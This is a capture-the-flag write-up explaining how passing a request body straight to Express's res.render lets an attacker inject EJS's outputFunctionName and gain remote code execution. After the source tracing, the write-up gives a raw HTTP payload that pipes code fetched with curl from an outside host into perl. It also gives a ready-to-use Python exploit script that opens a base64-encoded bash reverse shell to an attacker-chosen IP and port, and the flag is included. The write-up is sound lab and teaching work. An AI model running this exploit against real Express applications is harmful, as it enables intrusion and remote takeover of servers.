# echo

## Description:

![Description](./desc.jpg)

## Solution:

The line `<!-- /echo.zip -->` is in the website's source, thus to get the source code:

```console
root@kali:~# curl -k https://eductf.zoolab.org:49007/echo.zip > echo.zip
```

The main function is the following lines:

```javascript
app.post("/", (req, res) => {
  let data = req.body;
  res.render("echo.ejs", data);
});
```

The important thing here is that it passes `req.body` to `res.render` straight away, which can be fully controlled by user.

```javascript
// express/lib/response.js
res.render = function render(view, options, callback);
```

The second argument is supposed to be `data`, but in the definition is `options` instead. This is because `express.js` supplies some option values to the template engine to control its render behaviour, but it doesn't separate these options with the input argument (`data`), which causes an vulnerability.

The simplified implementation of `ejs.renderFile(view, options, callback)`:

```javascript
// ejs/lib/ejs.js
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = {filename: filename};
  var data;
  var viewOpts;

  cb = args.pop();
  data = args.shift();

  viewOpts = data.settings['view options'];
  if (viewOpts) {
    utils.shallowCopy(opts, viewOpts);
  }

  return tryHandleCache(opts, data, cb);
```

Here, `data` is our initial `req.body`. If the property `.settings['view options']` is present, its property object will be saved into `opts`, and sent to `tryHandleCache`. This will then call a series of functions.

```javascript
# ejs/lib/ejs.js
tryHandleCache(opts, data, cb)
    handleCache(opts)(data)
        compile(template, opts)
            new Template(template, opts)
                Template.compile()
```

As can be seen in `Template`'s constructor, `opts.outputFunctionName` will be saved.

```javascript
// ejs/lib/ejs.js
function Template(text, opts) {
    options.outputFunctionName = opts.outputFunctionName;
    this.opts = options;
```

Finally, in `compile()`, `outputFunctionName` will be appended into the compiled template javascript. Therefore, by controlling this variable, we can achieve arbitrary write of javascript code, and RCE.

```javascript
// ejs/lib/ejs.js
compile: function () {
    var opts = this.opts;

    if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
    }
}
```

### Raw HTTP Exploit

```
POST / HTTP/1.1
Host: eductf.zoolab.org:49007
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

settings[view options][outputFunctionName]=_;process.mainModule.constructor._load("child_process").exec("curl cyku.tw:8787 | perl");_
```

### Python Exploit

```python
import sys
import requests
import base64
import urllib.parse

if len(sys.argv) != 4:
    print()
    print('    Usage: python3 exploit.py <target url> <your ip> <your port>')
    print('         Example: python3 exploit.py http://localhost 54.87.54.87 8787')
    print()
    exit()

target = sys.argv[1]    # http://localhost
your_ip = sys.argv[2]   # 54.87.54.87
your_port = sys.argv[3] # 8787

command = base64.b64encode(f'/bin/bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1'.encode()).decode()
command = urllib.parse.quote(f'echo {command}|base64 -d|bash')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
res = requests.post(target, headers=headers, data=f'settings[view options][outputFunctionName]=_;process.mainModule.constructor._load("child_process").exec("{command}");_', verify=False)
```

`FLAG{I_th1nk_cyku_i5_0ur_w3b_g0d}`
